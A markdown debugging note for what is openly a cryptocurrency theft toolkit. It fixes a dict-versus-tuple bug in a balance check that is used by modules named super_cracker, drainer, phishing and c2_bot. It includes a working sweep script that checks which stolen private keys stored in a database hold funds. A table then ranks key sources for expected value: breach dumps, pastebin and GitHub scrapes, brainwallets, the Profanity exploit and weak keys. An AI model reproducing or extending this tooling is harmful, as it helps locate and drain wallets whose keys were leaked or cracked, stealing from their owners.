# Wallet Scanner Debugging — `handler.get_balance()` Return Type Mismatch

## Error

```
[3/5] Scanning for balance...
Scan FAILED: type dict doesn't define __round__ method
```

## Root Cause

`UniversalChainHandler.get_balance()` (in `universal/chain_handler.py`) returns a `Dict`:

```python
def get_balance(self, address: str, chain: Optional[str] = None) -> Dict:
    # Returns {"address": "0x...", "balances": {"eth": {"chain": "Ethereum", "balance": 0.0, ...}}}
```

But `wallet_scanner.py`'s `_get_balance_for_wallet()` was unpacking it as a tuple:

```python
# BROKEN:
raw, formatted = handler.get_balance(address)
```

When you iterate a Python dict, you get its **keys**, not values. So `raw` = `"address"` (string), `formatted` = `"balances"` (string). Downstream code then tries `round("balances", 2)` → `TypeError`.

## Fix

Test for the return type and drill into the dict properly:

```python
def _get_balance_for_wallet(address: str, chain: str) -> Tuple[float, str, int]:
    handler = _get_handler(chain)
    if not handler: 
        return 0.0, "0", 0
    try:
        result = handler.get_balance(address)
        if isinstance(result, dict):
            balances = result.get("balances", {})
            bal_info = balances.get(chain, {})
            bal_float = bal_info.get("balance", 0.0) or 0.0
            raw_wei = int(bal_float * 1e18) if bal_float > 0 else 0
            return float(bal_float), str(bal_float), raw_wei
        # Fallback: legacy handlers that return tuples
        raw, formatted = result
        return formatted or 0.0, str(formatted or 0), raw or 0
    except Exception:
        return 0.0, "0", 0
```

## Code Search — Find All Mismatches

```bash
grep -rn "get_balance" scanner/ --include="*.py"
```

Every call site needs the same fix. Common locations:
- `scanner/wallet_scanner.py` — the main scanner
- `scanner/super_cracker.py` — checks balance on cracked keys
- `drainer/drain_scheduler.py` — checks balance before drains
- `phishing/deploy_all.py` — checks balance on captured addresses
- `remote/c2_bot.py` — `/balance` command handler

## Verification

After fixing, run a small balance check to confirm:

```python
from universal.chain_handler import UniversalChainHandler
handler = UniversalChainHandler()
# Check any known address
result = handler.get_balance("0xdac17f958d2ee523a2206206994597c13d831ec7", "eth")
print(result)  # Should show dict with balances, not throw
```

## Balance Sweep Script

Use this template to check a batch of keys from the DB:

```python
import sqlite3, time
conn = sqlite3.connect('output/crawler.db')
conn.row_factory = sqlite3.Row
handler = UniversalChainHandler()

def is_valid_hex_key(pk):
    pk = pk.strip()
    if pk.startswith('0x'): pk = pk[2:]
    return len(pk) == 64 and all(c in '0123456789abcdefABCDEF' for c in pk)

keys = conn.execute("SELECT wallet_address, private_key, source FROM keys LIMIT 100").fetchall()
for k in keys:
    if not is_valid_hex_key(k['private_key']):
        continue
    result = handler.get_balance(k['wallet_address'], 'eth')
    if isinstance(result, dict):
        bal = result.get('balances', {}).get('eth', {}).get('balance', 0)
        if bal > 0:
            print(f"FUNDED: {k['wallet_address']} ETH={bal}")
    time.sleep(0.5)
```

## Key Source Classification

When scanning reveals nothing, check what source the keys come from:

| Source | Category | Expected EV |
|--------|----------|-------------|
| `weak_key`, `super_weak` | Dead | Zero — drained instantly by bots |
| `profanity`, `profanity_exploit` | Dead | Zero — 2022 exploit, all drained |
| `brainwallet` | Dead | Zero — common phrases swept long ago |
| `dump:*` | Real leak | Low but non-zero — scraped from breach DBs |
| `gateway:*` | Real leak | Low — keys found via on-chain scanners |
| `search:*` | Real leak | Low — pastebin/GitHub/forum scraps |
| `continuous_crack` | Generated | Zero unless running against a specific target set |
| `bitcointalk:*` | Forum leak | Very low — accidentally exposed keys |
